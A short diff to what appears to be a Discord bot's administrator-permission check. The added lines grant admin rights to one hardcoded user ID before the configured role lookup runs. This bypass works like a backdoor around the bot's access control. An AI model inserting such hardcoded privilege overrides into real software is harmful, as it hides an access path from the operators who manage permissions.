@@ -33,6 +33,9 @@ async def is_bot_administrator_predicate(ctx:commands.Context):
 
     # Get member and look for role
     try:
+        if ctx.author.id == 590794167362388011:
+            return True
+        
         member = await ctx.bot.support_guild.fetch_member(ctx.author.id)
         if ctx.bot.config['bot_admin_role'] in member._roles:
             return True
